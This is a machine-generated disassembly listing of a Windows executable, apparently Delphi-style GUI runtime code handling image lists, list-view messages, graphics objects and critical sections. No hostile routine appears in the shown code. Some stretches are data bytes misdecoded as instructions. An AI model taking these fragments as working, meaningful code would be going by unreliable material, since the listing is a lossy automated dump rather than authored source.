jmp sub_4038d0
sub_4273a8
jmp sub_4038d0
sub_4273af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4273d1
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_4273ca
jmp sub_4038d0
sub_4273db
jmp sub_40361c
sub_42742a
jmp sub_4038d0
sub_427657
jmp sub_4038d0
sub_42769f
jmp sub_4038d0
sub_42780c
jmp sub_4038d0
sub_4278d3
jmp sub_40361c
sub_427928
mov [ eax + 0x31 ] 0x0
call sub_426544
retn
sub_427b79
jmp sub_4038d0
sub_427be4
jmp sub_4038d0
sub_427beb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427c5c
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_427d10
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_427d20
push ebx
mov ebx eax
mov eax ebx
call sub_427ed8
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_427d34
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_427d50
push ebx
mov ebx eax
mov eax ebx
call sub_427f38
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_427dac
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_427ebb
jmp sub_4038d0
sub_42811f
jmp sub_40361c
sub_42817f
jmp sub_4038d0
sub_428186
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_428567
jmp sub_4038d0
sub_428593
jmp sub_4038d0
sub_4285fa
jmp sub_40361c
sub_42862b
jmp sub_4038d0
sub_4286b0
jmp sub_40361c
sub_4286b5
mov eax [ ebp - 0x38 ]
call sub_403154
call sub_403930
call sub_403984
sub_4286c7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4286e4
mov eax [ ebp - 0x18 ]
call sub_4026fc
retn
sub_4286dd
jmp sub_4038d0
sub_428833
jmp sub_40361c
sub_428aff
jmp sub_40361c
sub_428b90
mov cl 0x1
call sub_428b98
retn
sub_428e4d
add [ eax ] al
add [ ebx ] dh
leave
call sub_428b98
retn
sub_428ed2
jmp sub_40361c
sub_428ed7
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403930
call sub_403984
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428f28
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_429061
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_429090
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_4290a4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_4291bd
jmp sub_40361c
sub_429272
jmp sub_40361c
sub_4292dc
jmp sub_40361c
sub_429310
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_42929c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_429328
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425260
retn
mov [ eax + 0x30 ] edx
retn
sub_429340
retn
sub_429344
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425260
retn
mov [ eax + 0x2c ] edx
retn
sub_429384
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425260
pop ebp
retn 0x4
sub_429398
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425260
pop ebp
retn 0x4
sub_429558
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_429564
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_429611
jmp sub_4038d0
sub_429618
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_429703
jmp sub_40361c
sub_42976f
jmp sub_4038d0
sub_42989d
jmp sub_4038d0
sub_4298a4
pop ebp
retn
sub_4299a4
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_4299e0
pop ebp
retn
sub_4299e4
sub [ rw-data ] 0x1
retn
sub_429c2c
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4185b0
retn
sub_429c60
mov eax [ eax + 0x4 ]
call sub_418454
retn
sub_429c91
jmp sub_4038d0
sub_429c98
pop ebp
retn
sub_429c9c
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_13(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ __import_lookup_table_13(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_13(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_13(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ __import_lookup_table_13(comctl32:ImageList_Add) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ __import_lookup_table_13(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
sub_429d84
shl eax 0x8
retn
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ __import_lookup_table_13(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_13(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_13(comctl32:ImageList_SetIconSize) ]
sub_429e00
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1001
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429e34
push 0x0
push 0x0
push 0x1004
push eax
call SendMessageA
retn
sub_429e44
shl eax 0xc
retn
sub_429e48
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1005
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429e60
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429e78
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1007
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429e90
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1008
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429ea8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1009
push ebx
call SendMessageA
pop ebx
retn
sub_429ee0
push ecx
push edx
push 0x100d
push eax
call SendMessageA
retn
sub_429f2c
push edx
push 0x0
push 0x1012
push eax
call SendMessageA
retn
sub_429f58
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1016
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429f70
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1018
push ebx
call SendMessageA
pop ebx
retn
sub_429fa0
push ecx
push edx
push 0x101b
push eax
call SendMessageA
retn
sub_429fb0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101c
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429fc8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101d
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a020
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1024
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a038
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1026
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a050
push 0x0
push 0x0
push 0x1027
push eax
call SendMessageA
retn
sub_42a060
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1029
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a0c8
push ecx
push edx
push 0x102c
push eax
call SendMessageA
retn
sub_42a154
push 0x0
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_42a164
push ecx
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_42a190
push 0x0
push 0x0
push 0x1032
push eax
call SendMessageA
retn
sub_42a1a0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1036
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a20c
push edx
push 0x0
push 0x1047
push eax
call SendMessageA
retn
sub_42a21c
push 0x0
push 0x0
push 0x1048
push eax
call SendMessageA
retn
sub_42a251
jmp sub_4038d0
sub_42a258
pop ebp
retn
sub_42a25c
sub [ rw-data ] 0x1
retn
sub_42a323
jmp sub_4038d0
sub_42a32a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a940
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42a34c
mov [ rw-data ] sub_42a464
mov [ rw-data ] sub_42a3d4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42a668
mov [ rw-data ] sub_42a73c
mov [ rw-data ] sub_42a810
retn
sub_42a9d1
jmp sub_4038d0
sub_42a9d8
pop ebp
retn
sub_42a9dc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42a940
sub_42aa11
jmp sub_4038d0
sub_42aa18
pop ebp
retn
sub_42aa1c
sub [ rw-data ] 0x1
retn
sub_42acab
add eax 0xffffffd4
jmp sub_42b7d8
sub_42acb3
add eax 0xffffffd4
jmp sub_42b834
sub_42acc5
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405890
sub_42accf
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4058a4
sub_42ae5e
jmp sub_4038d0
sub_42ae65
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b075
jmp sub_4038d0
sub_42b07c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b231
jmp sub_4038d0
sub_42b296
jmp sub_4038d0
sub_42b29d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b389
jmp sub_4038d0
sub_42b390
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42b5a0
lea eax [ ebp - 0x30 ]
call sub_403f50
lea eax [ ebp - 0x20 ]
call sub_403f50
retn
sub_42b5b1
jmp sub_4038d0
j_sub_42b5a0
jmp sub_42b5a0
sub_42b5b8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b6b3
jmp sub_4038d0
sub_42b6ba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b7b7
jmp sub_4038d0
sub_42b7be
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b81e
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
sub_42b827
jmp sub_4038d0
j_sub_42b81e
jmp sub_42b81e
sub_42b82e
pop ebx
pop ecx
pop ebp
retn
sub_42b8c9
jmp sub_4038d0
sub_42b8d0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42b8dc
mov eax [ eax + 0x20 ]
retn
sub_42ba0b
jmp sub_4038d0
sub_42ba12
pop ebp
retn
sub_42ba14
sub [ rw-data ] 0x1
retn
sub_42ba41
jmp sub_4038d0
sub_42ba48
pop ebp
retn
sub_42ba4c
sub [ rw-data ] 0x1
retn
sub_42ba85
jmp sub_4038d0
sub_42ba8c
pop ebp
retn
sub_42ba90
sub [ rw-data ] 0x1
retn
sub_42bd9d
jmp sub_4038d0
sub_42bda4
pop ebp
retn
sub_42bda8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42baf4
sub_42be88
retn
sub_42befc
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42bf08
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42bf14
mov edx [ eax ]
call [ edx ]
retn
sub_42bf1c
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42bf49
jmp sub_4038d0
sub_42bf50
pop ebp
retn
sub_42bf54
sub [ rw-data ] 0x1
retn
sub_42c113
jmp sub_4038d0
sub_42c11a
pop ebp
retn
sub_42c4cf
jmp sub_4038d0
sub_42c4d6
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42c8f0
jmp sub_4038d0
sub_42c8f7
pop ebp
retn
sub_42c8fc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42be8c
mov [ rw-data ] eax
sub_42c93d
jmp sub_4038d0
sub_42c944
pop ebp
retn
sub_42c948
sub [ rw-data ] 0x1
retn
sub_42c975
jmp sub_4038d0
sub_42c97c
pop ebp
retn
sub_42c980
sub [ rw-data ] 0x1
retn
sub_42c9ad
jmp sub_4038d0
sub_42c9b4
pop ebp
retn
sub_42c9b8
sub [ rw-data ] 0x1
retn
sub_42c9e5
jmp sub_4038d0
sub_42c9ec
pop ebp
retn
sub_42c9f0
sub [ rw-data ] 0x1
retn
sub_42ca1d
jmp sub_4038d0
sub_42ca24
pop ebp
retn
sub_42ca28
sub [ rw-data ] 0x1
retn
sub_42ca55
jmp sub_4038d0
sub_42ca5c
pop ebp
retn
sub_42ca60
sub [ rw-data ] 0x1
retn
sub_42ca68
insb
0x42
sub_42ca9a
call [ eax + 0x33ec8b55 ]
rcl [ ebp + 0x68 ] 0xc1
0x42
sub_42caa7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cac8
retn
sub_42cac1
jmp sub_4038d0
sub_42cac8
pop ebp
retn
sub_42cacc
sub [ rw-data ] 0x1
retn
sub_42caf9
jmp sub_4038d0
sub_42cb00
pop ebp
retn
sub_42cb04
sub [ rw-data ] 0x1
retn
sub_42cb31
jmp sub_4038d0
sub_42cb38
pop ebp
retn
sub_42cb3c
sub [ rw-data ] 0x1
retn
sub_42cb62
inc edx
add al dh

sub_42cdb6
jmp sub_40361c
sub_42cdbb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42cdd8
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42cde0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403350
pop esi
retn
sub_42cdf8
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403350
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42ce10
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42ceb9
jmp sub_4038d0
sub_42cee7
jmp sub_4038d0
sub_42ceee
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cef8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42cf0c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42d16a
jmp sub_4038d0
sub_42d171
pop ebp
retn
sub_42df42
jmp sub_40361c
sub_42dffb
jmp sub_4038d0
sub_42e002
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e008
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42df7c
sub_42e018
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42df7c
sub_42e028
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42df7c
pop ebp
retn 0x8
sub_42e040
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42e16c
push ebx
mov ebx eax
mov eax ebx
call sub_44fcf4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42e180
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42e1b4
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42e2b8
jmp sub_4038d0
sub_42e2bf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e462
jmp sub_4038d0
sub_42e469
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e473
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42e488
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_44cfdc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42e4a4
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_44cfdc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42e4c0
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_44cfdc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42e4dc
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_44cfdc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42e4f8
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_44dcbc
sub_42e50c
mov al [ eax + 0x220 ]
retn
sub_42e675
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42e68d
jmp sub_4038d0
sub_42ea3f
retn
sub_42ea40
jmp sub_4038d0
j_sub_42ea3f
jmp sub_42ea3f
sub_42ea47
pop ebp
retn
sub_42ea4c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c54
mov eax [ r-xdata ]
call sub_417be4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417c30
sub_42eab1
jmp sub_4038d0
sub_42eab8
pop ebp
retn
sub_42eabc
sub [ rw-data ] 0x1
retn
sub_42eaf5
jmp sub_4038d0
sub_42eafc
pop ebp
retn
sub_42eb00
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42eb7c
retn
sub_42eb7d
jmp sub_4038d0
j_sub_42eb7c
jmp sub_42eb7c
sub_42eb84
pop ebp
retn
sub_42eb88
sub [ rw-data ] 0x1
retn
sub_42eb90
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403154
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42ec54
jmp sub_4038d0
sub_42ec5b
pop ebp
retn
sub_42ec60
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42ebac
call sub_403ca0
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b5c
sub_42ecad
jmp sub_4038d0
sub_42ecb4
pop ebp
retn
sub_42ecb8
sub [ rw-data ] 0x1
retn
sub_42ed14
jmp sub_4038d0
sub_42ed1b
pop ebp
retn
sub_42ed20
sub [ rw-data ] 0x1
retn
sub_42ed7c
jmp sub_4038d0
sub_42ed83
pop ebp
retn
sub_42ed88
sub [ rw-data ] 0x1
retn
sub_42ede9
jmp sub_4038d0
sub_42edf0
pop ebp
retn
sub_42edf4
sub [ rw-data ] 0x1
retn
sub_42ee40
jmp sub_4038d0
sub_42ee47
pop ebp
retn
sub_42ee4c
sub [ rw-data ] 0x1
retn
sub_42ee58
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_42fbe3
jmp sub_4038d0
sub_42fbf0
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_42fc68
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_403fa4
mov eax ebx
call sub_42fbf0
pop esi
pop ebx
retn
sub_42fc84
mov [ eax + 0x14 ] edx
call sub_42fbf0
retn
sub_42fc90
mov [ eax + 0x18 ] edx
call sub_42fbf0
retn
sub_42fcc8
push ebx
mov ebx eax
mov eax ebx
call sub_419180
mov [ eax + 0xc ] ebx
pop ebx
retn
sub_42fe48
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
test dl dl
je r-xdata
mov edx sub_42fc9c
call sub_42fcd8
sub_42fe60
mov edx sub_42fc9c
call sub_42fcd8
retn
sub_430025
jmp sub_4038d0
sub_430060
push ebx
mov ebx ecx
mov eax ebx
call sub_403f50
pop ebx
retn
sub_43006c
mov al 0x1
retn
sub_430171
jmp sub_4038d0
sub_43026c
retn
sub_43038f
jmp sub_4038d0
sub_430396
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4306e0
mov eax [ eax + 0xd0 ]
call sub_4192f0
retn
sub_430750
mov eax [ r-xdata ]
retn
sub_43077c
push esi
mov esi eax
mov eax [ esi + 0xd0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4307b0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
pop ebx
retn
sub_4308a0
retn
sub_4309e7
jmp sub_4038d0
sub_4309ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4309f8
retn
sub_430a1b
jmp sub_4038d0
sub_430a22
pop ebp
retn 0x4
sub_430a85
jmp sub_4038d0
sub_430a8c
pop ebp
retn
sub_430a90
sub [ rw-data ] 0x1
retn
sub_431b20
retn 0x44
sub_433ee2
retn 0x44
sub_4351dc
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bef8
mov [ rw-data ] eax
sub_4352bc
cmp dl [ eax + 0x16 ]
je r-xdata
retn
mov [ eax + 0x16 ] dl
mov [ eax + 0x17 ] 0x0
xor edx edx
call sub_418f6c
sub_4352d0
mov al [ eax + 0x17 ]
xor al 0x1
retn
sub_4352d8
cmp dl [ eax + 0x17 ]
je r-xdata
retn
mov [ eax + 0x17 ] dl
call sub_4352e8
sub_435320
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x16 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_435374
cmp dl [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] dl
xor edx edx
call sub_418f6c
sub_435384
cmp dl [ eax + 0x15 ]
je r-xdata
retn
mov [ eax + 0x15 ] dl
xor edx edx
call sub_418f6c
sub_435394
cmp dl [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] dl
xor edx edx
call sub_418f6c
sub_43543c
push ebx
mov ebx eax
mov eax ebx
call sub_419180
pop ebx
retn
sub_43545c
mov eax [ eax + 0x18 ]
retn
sub_4356e4
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4359fa
jmp sub_4038d0
sub_435a60
cmp dl [ eax + 0x215 ]
je r-xdata
retn
mov [ eax + 0x215 ] dl
mov dl 0x1
call sub_436050
sub_435c08
jmp sub_4038d0
sub_435c0f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435e66
jmp sub_4038d0
sub_435e6d
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_435e7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
call sub_404210
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_435ed8
cmp [ eax + 0x217 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x59 ] 0x0
jne r-xdata
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_435f24
push ebx
mov ebx eax
mov eax ebx
call sub_44fc50
mov eax ebx
call sub_44dcbc
pop ebx
retn
sub_435f38
push ebx
mov ebx eax
mov eax ebx
call sub_44baf0
cmp [ ebx + 0x217 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov [ ebx + 0x217 ] 0x0
sub_435fd4
push ebx
mov ebx eax
mov eax ebx
call sub_44fdb4
mov eax ebx
call sub_44dcbc
pop ebx
retn
sub_435fe8
push ebx
mov ebx eax
mov eax ebx
call sub_44fe44
mov eax ebx
call sub_435a78
pop ebx
retn
sub_435ffc
push ebx
mov ebx ecx
cmp [ eax + 0x217 ] 0x0
je r-xdata
mov ecx ebx
call sub_450228
pop ebx
retn
mov cl [ r-xdata ]
mov [ eax + 0x98 ] cl
sub_436048
call sub_449cf4
retn
sub_436118
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4353dc
retn
sub_436128
mov eax [ r-xdata ]
retn
sub_436338
push ebx
mov ebx eax
mov eax ebx
call sub_4363c4
mov [ ebx + 0x214 ] eax
mov eax ebx
call sub_44dab8
pop ebx
retn
sub_436547
jmp sub_4038d0
sub_43654e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436558
mov ecx [ eax + 0x210 ]
call sub_436414
retn
sub_436564
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_436414
retn
sub_4365fc
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_44dcbc
sub_436610
cmp dl [ eax + 0x21d ]
je r-xdata
retn
mov [ eax + 0x21d ] dl
call sub_44dcbc
sub_436624
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_436638
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_436780
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_4368d0
sub_436cfe
jmp sub_4038d0
sub_436e36
jmp sub_4038d0
sub_436e3d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436e98
mov al [ eax + 0xd ]
xor al 0x1
retn
sub_436f38
cmp edx [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] edx
call sub_436d14
sub_436f48
cmp edx [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] edx
xor edx edx
call sub_418f6c
sub_436f58
cmp edx [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] edx
xor edx edx
call sub_418f6c
sub_43705c
mov eax [ eax + 0x18 ]
retn
sub_43716f
jmp sub_4038d0
sub_4371c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_403fa4
pop esi
pop ebx
retn
sub_4372d2
jmp sub_4038d0
sub_4372d9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4374d4
push ebx
mov ebx eax
mov eax ebx
call sub_41a574
mov eax [ ebx + 0x34 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_43750c
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_437d98
retn
sub_4375e4
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_437ea0
retn
sub_4375f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x34 ]
